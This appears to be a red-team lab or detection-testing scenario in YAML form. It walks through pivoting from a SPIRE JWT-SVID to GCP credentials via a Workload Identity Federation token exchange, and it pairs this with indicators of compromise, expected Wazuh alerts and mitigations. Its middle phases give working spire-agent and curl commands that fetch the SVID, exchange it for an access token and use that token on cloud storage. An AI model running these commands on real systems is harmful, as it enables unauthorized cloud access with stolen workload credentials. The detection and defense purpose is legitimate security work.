name: Workload Identity Federation Cross-Cloud Pivot
description: Exchange a SPIRE JWT-SVID for cloud provider credentials via Workload Identity Federation (WIF), pivoting from a SPIFFE identity to cloud IAM access. The attacker obtains a JWT-SVID from the SPIRE Workload API and uses it as a subject_token in a GCP Security Token Service (STS) exchange, receiving a GCP access token that grants access to cloud resources.
real_world_relevance: GCP Workload Identity Federation allows external identity providers (including SPIRE) to exchange tokens for GCP credentials without static service account keys. This is a legitimate pattern, but if an attacker obtains a JWT-SVID (via selector spoofing, container escape, or workload API socket access), they can pivot from the SPIFFE identity plane into cloud IAM. The 2024 AWS IMDSv1 attacks and GCP metadata server exploits demonstrate similar token exchange pivots in cloud environments.

techniques.name: Use Alternate Authentication Material: Application Access Token

attack_flow.description: Attacker obtains a SPIRE JWT-SVID and exchanges it for GCP cloud credentials via Workload Identity Federation STS endpoint
diagram: 1. Attacker gains access to SPIRE Workload API socket (e.g., via container escape or pod compromise)
2. Fetches a JWT-SVID from the SPIRE agent with audience set to the GCP WIF provider
3. Sends the JWT-SVID to GCP STS token exchange endpoint as subject_token
4. GCP WIF validates the SVID against the configured SPIRE trust bundle
5. GCP returns a federated access token mapped to a GCP service account
6. Attacker uses the GCP access token to access cloud resources (GCS, Compute, IAM)
7. Cloud audit logs show access from the mapped service account, not the original SPIFFE identity

phases.name: Workload API Socket Discovery
phases.description: Locate the SPIRE Workload API socket and verify access to fetch SVIDs

actions.description: Verify workload API socket is accessible
Verify SVID fetch capability — confirms workload API access
Alternative socket discovery via mount info or filesystem search

phases.name: JWT-SVID Acquisition
phases.description: Fetch a JWT-SVID from the SPIRE agent with the audience set to the GCP Workload Identity Federation provider

actions.description: Fetch JWT-SVID with GCP WIF audience claim

actions.command: JWT=$(/opt/spire/bin/spire-agent api fetch jwt -audience gcp-wif -socketPath /opt/spire/sockets/workload_api.sock 2>&1 | grep -oP 'token\(.*?\):\K.*') && echo $JWT | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
actions.description: Extract and decode JWT payload to verify SPIFFE ID, audience, and expiration claims
Fetch JWT-SVID with full GCP WIF provider audience URI for realistic exchange

phases.name: GCP STS Token Exchange
phases.description: Exchange the JWT-SVID for a GCP federated access token via the Security Token Service

actions.command: JWT=$(/opt/spire/bin/spire-agent api fetch jwt -audience gcp-wif -socketPath /opt/spire/sockets/workload_api.sock 2>&1 | grep -oP 'token\(.*?\):\K.*') && curl -s -X POST http://gcp-metadata:1339/v1/token -H 'Content-Type: application/x-www-form-urlencoded' -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$JWT&subject_token_type=urn:ietf:params:oauth:token-type:jwt&audience=//iam.googleapis.com/projects/123456/locations/global/workloadIdentityPools/spire-pool/providers/spire-provider"
actions.description: Exchange JWT-SVID for GCP STS federated token

actions.command: GCP_TOKEN=$(curl -s -X POST http://gcp-metadata:1339/v1/token -H 'Content-Type: application/x-www-form-urlencoded' -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$JWT&subject_token_type=urn:ietf:params:oauth:token-type:jwt&audience=//iam.googleapis.com/projects/123456/locations/global/workloadIdentityPools/spire-pool/providers/spire-provider" | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])') && echo "GCP Token acquired: ${GCP_TOKEN:0:20}..."
actions.description: Extract GCP access token from STS response

phases.name: Cloud Resource Access
phases.description: Use the acquired GCP access token to access cloud resources — demonstrating the cross-cloud pivot

actions.description: Access GCP project metadata using the exchanged token
Retrieve the service account email mapped to the SPIFFE identity
Enumerate OAuth scopes granted to the exchanged token — reveals cloud access permissions

actions.command: curl -s -H "Authorization: Bearer $GCP_TOKEN" 'https://storage.googleapis.com/storage/v1/b?project=victim-project-123' 2>/dev/null || echo 'GCS access attempted (mock environment)'
actions.description: Attempt to list GCS buckets — demonstrates cloud resource access via SPIFFE pivot

indicators_of_compromise.description: JWT-SVID fetched with cloud provider audience (gcp-wif, iam.googleapis.com)
STS token exchange request to GCP WIF endpoint using JWT-SVID as subject_token
Cloud metadata access using token obtained via SPIFFE-to-cloud token exchange
JWT-SVID fetch with non-standard audience indicating cross-cloud pivot attempt
Cloud API calls from workload identity federation principal — source identity is SPIFFE

expected_wazuh_alerts.description: NHI: JWT-SVID fetched with cloud provider audience
NHI: Workload Identity Federation token exchange — SPIFFE to cloud pivot
NHI: Cloud metadata access with exchanged credentials

immediate: Revoke the GCP access token obtained via the WIF exchange
Rotate the SPIRE agent attestation credentials on the affected node
Review GCP Cloud Audit Logs for all actions taken with the federated token
Remove the compromised workload's registration entry from SPIRE
Restrict access to the SPIRE Workload API socket on the affected pod/node
long_term: Implement audience restrictions on SPIRE registration entries to limit which audiences can be requested
Configure GCP WIF with attribute conditions that restrict which SPIFFE IDs can exchange tokens
Use GCP WIF attribute mapping to enforce principal/principalSet constraints
Monitor JWT-SVID fetch patterns and alert on unusual audience values
Implement short-lived JWT-SVID TTLs (5 minutes or less) to limit token exchange windows
Deploy SPIRE Workload API socket access controls using Kubernetes PodSecurityPolicies or OPA
Enable GCP VPC Service Controls to limit what the federated token can access
Forward GCP Cloud Audit Logs to SIEM and correlate with SPIRE audit events for full attack chain visibility
